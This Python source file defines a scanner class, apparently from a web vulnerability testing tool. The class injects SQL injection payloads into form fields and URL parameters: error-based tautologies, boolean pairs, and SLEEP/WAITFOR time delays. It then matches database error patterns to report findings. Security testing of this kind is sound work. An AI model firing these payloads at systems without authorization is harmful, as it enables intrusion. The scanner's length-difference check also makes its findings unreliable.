from core.base_scanner import BaseScanner
from core.utils import RequestUtils
import re
from typing import List, Dict, Optional
import logging
from urllib.parse import urljoin
import time

class SQLInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        self.payloads = [
            "' OR '1'='1",
            "' UNION SELECT '1",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR '1'='1'--",
            "' OR 1=1#",
            "' OR EXISTS(SELECT 1)--"
        ]
        
        self.boolean_payloads = [
            ("' AND '1'='1", "' AND '1'='2"), 
            ("' OR '1'='1", "' OR '1'='2"),   
            ("1' OR '1'='1", "1' OR '1'='2")  
        ]
        
        self.time_payloads = [
            "'; SELECT SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--",
            "' AND SLEEP(5)--"
        ]

    def scan(self) -> Dict:
        try:
            results = []
            response = self.make_request(self.target_url)
            
            if not response:
                return {'sql_injection': []}

            forms = RequestUtils.extract_forms(response.text)
            for form in forms:
                form_url = urljoin(self.target_url, form['action'] or self.target_url)
                for input_field in form['inputs']:
                    if input_field['type'] not in ['submit', 'button', 'image', 'file']:
                        for payload in self.payloads:
                            if self.test_injection(form_url, form['method'], input_field['name'], payload):
                                results.append({
                                    'url': form_url,
                                    'method': form['method'],
                                    'parameter': input_field['name'],
                                    'payload': payload,
                                    'type': 'Error-based SQL Injection',
                                    'severity': 'High'
                                })
                                continue 

                        for true_payload, false_payload in self.boolean_payloads:
                            if self.test_boolean_injection(form_url, form['method'], input_field['name'], 
                                                         true_payload, false_payload):
                                results.append({
                                    'url': form_url,
                                    'method': form['method'],
                                    'parameter': input_field['name'],
                                    'payload': f"{true_payload} vs {false_payload}",
                                    'type': 'Boolean-based SQL Injection',
                                    'severity': 'High'
                                })
                                continue

                        for payload in self.time_payloads:
                            if self.test_time_based_injection(form_url, form['method'], 
                                                            input_field['name'], payload):
                                results.append({
                                    'url': form_url,
                                    'method': form['method'],
                                    'parameter': input_field['name'],
                                    'payload': payload,
                                    'type': 'Time-based SQL Injection',
                                    'severity': 'High'
                                })

            query_params = self.extract_url_parameters(self.target_url)
            for param in query_params:
                for payload in self.payloads:
                    if self.test_injection(self.target_url, 'get', param, payload):
                        results.append({
                            'url': self.target_url,
                            'method': 'get',
                            'parameter': param,
                            'payload': payload,
                            'type': 'Error-based SQL Injection',
                            'severity': 'High'
                        })

                for true_payload, false_payload in self.boolean_payloads:
                    if self.test_boolean_injection(self.target_url, 'get', param, 
                                                 true_payload, false_payload):
                        results.append({
                            'url': self.target_url,
                            'method': 'get',
                            'parameter': param,
                            'payload': f"{true_payload} vs {false_payload}",
                            'type': 'Boolean-based SQL Injection',
                            'severity': 'High'
                        })

            return {'sql_injection': results}

        except Exception as e:
            logging.error(f"SQL Injection scanner error: {e}")
            return {'sql_injection': [], 'error': str(e)}

    def test_injection(self, url: str, method: str, param: str, payload: str) -> bool:
        try:
            normal_data = {param: "normal"}
            normal_response = self.make_request(
                url,
                method=method.upper(),
                data=normal_data if method.lower() == 'post' else None,
                params=normal_data if method.lower() == 'get' else None
            )

            data = {param: payload}
            response = self.make_request(
                url,
                method=method.upper(),
                data=data if method.lower() == 'post' else None,
                params=data if method.lower() == 'get' else None
            )
            
            if not response or not normal_response:
                return False

            if len(response.text) != len(normal_response.text):
                logging.info(f"Found potential SQL injection at {url} with parameter {param} (different response lengths)")
                return True

            error_patterns = [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_.*",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"ORA-[0-9][0-9][0-9][0-9]",
                r"Microsoft SQL Server",
                r"SQLITE_ERROR",
                r"SQLite/JDBCDriver",
                r"System.Data.SQLite.SQLiteException",
                r"Warning.*sqlite_.*",
                r"SQLite3::SQLException",
                r"System.Data.SQLite.Raw.SQLException"
            ]

            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    logging.info(f"Found SQL injection at {url} with parameter {param} (error pattern match)")
                    return True

            return False

        except Exception as e:
            logging.error(f"Error testing SQL injection: {e}")
            return False

    def test_boolean_injection(self, url: str, method: str, param: str, 
                             true_payload: str, false_payload: str) -> bool:
        try:
            true_data = {param: true_payload}
            true_response = self.make_request(
                url,
                method=method.upper(),
                data=true_data if method.lower() == 'post' else None,
                params=true_data if method.lower() == 'get' else None
            )

            false_data = {param: false_payload}
            false_response = self.make_request(
                url,
                method=method.upper(),
                data=false_data if method.lower() == 'post' else None,
                params=false_data if method.lower() == 'get' else None
            )

            if not true_response or not false_response:
                return False

            if abs(len(true_response.text) - len(false_response.text)) > 50:  # Threshold
                logging.info(f"Found boolean-based SQL injection at {url} with parameter {param}")
                return True

            return False

        except Exception as e:
            logging.error(f"Error testing boolean-based SQL injection: {e}")
            return False

    def test_time_based_injection(self, url: str, method: str, param: str, payload: str) -> bool:
        try:
            start_time = time.time()

            data = {param: payload}
            response = self.make_request(
                url,
                method=method.upper(),
                data=data if method.lower() == 'post' else None,
                params=data if method.lower() == 'get' else None
            )

            elapsed_time = time.time() - start_time

            if elapsed_time > 4.5: 
                logging.info(f"Found time-based SQL injection at {url} with parameter {param}")
                return True

            return False

        except Exception as e:
            logging.error(f"Error testing time-based SQL injection: {e}")
            return False

    def extract_url_parameters(self, url: str) -> List[str]:
        try:
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            return list(params.keys())
        except Exception as e:
            logging.error(f"Error extracting URL parameters: {e}")
            return []